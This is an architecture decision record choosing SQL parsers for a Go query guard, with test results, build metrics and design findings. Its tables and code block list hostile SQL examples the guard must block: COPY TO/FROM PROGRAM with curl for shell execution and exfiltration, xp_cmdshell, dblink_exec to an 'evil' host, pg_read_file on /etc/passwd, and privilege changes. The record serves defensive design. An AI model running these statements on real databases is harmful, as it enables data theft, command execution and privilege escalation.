# ADR 0001 — SQL parser selection

- **Status:** Accepted
- **Date:** 2026-08-14
- **Decides:** the open question "Parser per dialect (cgo trade-off)" from [`docs/PHASES.md`](../PHASES.md), which gates M3
- **Supersedes:** the assumption in [`CLAUDE.md`](../../CLAUDE.md) that using PostgreSQL's real parser means accepting cgo

---

## Context

`CLAUDE.md` requires per-dialect parsing with a real parser, never regex, and simultaneously requires a single
static binary. Those two requirements appeared to conflict: the most faithful PostgreSQL parser available to Go
is `pganalyze/pg_query_go`, which wraps PostgreSQL's own C parser through **cgo** — which in turn means a C
toolchain, harder cross-compilation, and per-platform build runners. SQL Server looked worse: no parser of
comparable quality was known, and regex is forbidden by the working agreements.

This spike ran an adversarial corpus of **35 PostgreSQL** and **19 T-SQL** statements through candidate parsers,
written the way the real guard would be written, plus a fail-closed probe and a build matrix.

## Decision

| Dialect | Library | cgo? |
|---|---|---|
| PostgreSQL | [`github.com/wasilibs/go-pgquery`](https://github.com/wasilibs/go-pgquery) — libpg_query compiled to WebAssembly, run on wazero | **No** |
| SQL Server | [`github.com/sqlc-dev/teesql`](https://github.com/sqlc-dev/teesql) — pure Go, AST mirrors Microsoft's ScriptDom | **No** |

**The conflict dissolves.** `go-pgquery` is PostgreSQL's *actual* parser — the same libpg_query C code — compiled
to wasm and executed by a pure-Go runtime. We get byte-for-byte upstream grammar fidelity with
`CGO_ENABLED=0`, static binaries, and free cross-compilation. It exposes the same API as `pg_query_go` and returns
`pganalyze` types, so the escape hatch is a build tag (`-tags pgquery_cgo`) rather than a rewrite.

## Evidence

Versions tested: Go 1.26.6 · `go-pgquery` v0.0.0-20260728010200 · `pg_query_go` v6.2.2 (types) · wazero v1.12.0 ·
`teesql` v1.1.0.

**Correctness — the corpus is the point, and both cleared it:**

| | PostgreSQL | SQL Server |
|---|---|---|
| Adversarial corpus | **35 / 35** | **19 / 19** |

Cases that a naive guard fails and these did not: `WHERE 1=1` and `WHERE id = 1 OR true`; `;`-stacked statements;
`DROP` hidden in a line or block comment; a semicolon inside a string literal; `DELETE` buried in a CTE under a
top-level `SELECT`; `SELECT INTO`; `COPY ... FROM PROGRAM`; `DO $$ ... $$`; `EXPLAIN ANALYZE`; `GRANT`; `SET ROLE`;
bracket-quoted and three-part T-SQL names; a T-SQL batch with **no separator at all** (`SELECT 1 DROP TABLE orders`);
`EXEC`, `sp_executesql`, `xp_cmdshell`; and a Cyrillic homoglyph table name that must *not* match an `orders`
allow-list entry.

**Build and cost:**

| Property | Result |
|---|---|
| `CGO_ENABLED=0` cross-compile | **5 / 5** targets: linux/amd64, linux/arm64, darwin/arm64, darwin/amd64, windows/amd64 |
| Binary size | baseline 2.3 MB → +14 MB (go-pgquery incl. wasm) → +5.6 MB (teesql). Combined ≈ 20 MB |
| Parse latency, Postgres | 16 µs simple, 26 µs complex |
| Parse latency, T-SQL | 79 µs simple, 160 µs complex |
| **Cold start** | **~895 ms on the first parse** — wazero compiling the wasm module |

Latency is irrelevant next to a database round-trip. The ~20 MB binary is a fair price for a correct guard.

⚠ **The cold start is an operational requirement, not a curiosity:** the server must parse a throwaway statement
during startup so the first real request does not pay ~0.9 s. Investigate wazero's compilation cache in M0.

## What this changes in the design

The spike surfaced three things that alter the guard's shape. These are findings, not preferences.

### 1. The guard must ALLOW-LIST statement types, not deny-list DDL

`CLAUDE.md` principle 2 says *"classify as read / DML / DDL. DDL is rejected always."* That framing is a
deny-list, and a deny-list **misses**:

| Statement | Is it DDL? | What it does |
|---|---|---|
| `COPY orders FROM PROGRAM 'curl ...'` | No | Executes shell commands as the database OS user |
| `COPY (SELECT ...) TO PROGRAM 'curl -d @-'` | No | Exfiltrates the table |
| `DO $$ BEGIN DELETE FROM orders; END $$` | No | Runs arbitrary PL/pgSQL; the `DELETE` is invisible to classification |
| `EXPLAIN ANALYZE DELETE FROM orders` | No | **Actually executes** the statement |
| `GRANT ALL ON orders TO PUBLIC` | No (DCL) | Privilege escalation |
| `SET ROLE postgres` | No | Re-points every subsequent gate at another identity |
| `EXEC xp_cmdshell 'dir'` | No | Command execution, T-SQL flavour |

The guard therefore executes exactly `SelectStmt`, `InsertStmt`, `UpdateStmt`, `DeleteStmt`, `MergeStmt`, and
`ExplainStmt` **without ANALYZE** — and refuses every other node type by default. New PostgreSQL releases add
statement types; an allow-list fails closed against them, a deny-list fails open. Recommend amending
`CLAUDE.md` principle 2 accordingly.

### 2. Statement-type checking cannot see inside function calls

These classify as ordinary reads, and every gate passes them:

```sql
SELECT dblink_exec('host=evil', 'DELETE FROM orders');  -- writes to another host
SELECT lo_export(1, '/tmp/x');                          -- writes a file
SELECT pg_read_file('/etc/passwd');                     -- reads a file
SELECT pg_sleep(10);                                    -- stalls a connection
```

The spike confirmed function names **are** extractable from the parse tree (`FuncCall` → `funcname`), so a
function-name gate is implementable. But it is a deny-list against an open set, which is exactly the shape we
just rejected in finding 1 — an allow-list of functions is impractical for real analytical queries.

**Therefore: the scoped database `GRANT` is the real boundary, not the guard.** `CLAUDE.md` principle 5 already
says our guards are defence in depth and not a substitute for a correct `GRANT`; this spike upgrades that from
good advice to a **load-bearing requirement**, and the security posture document (M5) must say so plainly. A
function deny-list covering the known-dangerous set is still worth having as a second layer.

### 3. Two smaller mechanics, both confirmed implementable

- **`INSERT ... EXEC` (T-SQL)** surfaces only as `InsertStatement`, so a stored procedure would run behind an
  allow-listed INSERT. The tree does expose `InsertSource`, so the guard permits only `ValuesInsertSource` and
  `SelectInsertSource` and refuses `ExecuteInsertSource`.
- **Unqualified names resolve at execution time** — through `search_path` in PostgreSQL, the default schema in
  SQL Server. An allow-list entry checked against a name the *server* resolves differently is a gate bypass, so
  the server must **pin `search_path` on every connection** (and the default schema for T-SQL), or require
  schema-qualified names outright. Note that `"Orders"` and `orders` are genuinely different tables: the
  allow-list comparison must never case-fold.

## Residual risks

- ⚠ **`teesql` is young.** v1.1.0, published July 2026, no public importers yet. Its AST mirrors ScriptDom, which
  is a strong provenance signal, and it cleared 19/19 — but it is the least-proven dependency in the project.
  **Mitigation:** pin and vendor it; keep the T-SQL corpus as a regression suite that runs against every bump;
  and keep the guard's allow-list posture so an unmodelled construct fails closed. If it is abandoned, the
  fallback is an ANTLR-generated grammar from `grammars-v4` (pure Go, heavier) — worse, but not a dead end.
- ⚠ **`teesql` is lenient: it returns no error for garbage.** `@@@ not sql`, `SELECT * FROM`, and an unterminated
  literal all parse without error. It does **not** silently drop input — every probe accounted for the full input
  span and surfaced the dangerous statements (`@@@ DROP TABLE orders` yields `LabelStatement` **and**
  `DropTableStatement`) — so the allow-list plus the multi-statement check contains it. **The guard must not rely
  on the parser for syntax validation**, and should assert that parsed statement fragments span the entire input.
- ⚠ **`go-pgquery` is pre-v1** (no tagged release). It is a thin wrapper over versioned libpg_query, and
  `-tags pgquery_cgo` swaps in the official cgo library using identical code, so the exposure is packaging, not
  grammar.
- ⚠ **wasm is ~4–5× slower than cgo** per the upstream benchmarks. At 16–26 µs per parse this is noise; it would
  only matter if RTFQ ever parsed at high volume, which it does not.

## Consequences

- M2's parser spike is **closed**; M3 is unblocked.
- M5's release pipeline is **simple**: `CGO_ENABLED=0` everywhere, no C toolchain, no per-platform runners, and
  goreleaser stays boring. This was the outcome most at risk.
- No C compiler is needed for development either — relevant, since the dev machine has none.
- The M3 adversarial suite has its seed: the corpus in `spike/parser/corpus/` graduates to `internal/guard/testdata`.

## Reproduction

The spike lives in [`spike/parser/`](../../spike/parser) — throwaway code, not part of the build, kept as evidence.

```bash
docker run --rm -v "$PWD/spike/parser:/work" -w /work golang:1-bookworm bash -c '
  CGO_ENABLED=0 go run ./cmd/pg &&        # PostgreSQL corpus      (35 cases)
  CGO_ENABLED=0 go run ./cmd/tsql &&      # SQL Server corpus      (19 cases)
  CGO_ENABLED=0 go run ./cmd/robust &&    # fail-closed probe
  CGO_ENABLED=0 go run ./cmd/failopen &&  # input-coverage probe
  CGO_ENABLED=0 go run ./cmd/holes'       # function / InsertSource gaps
```
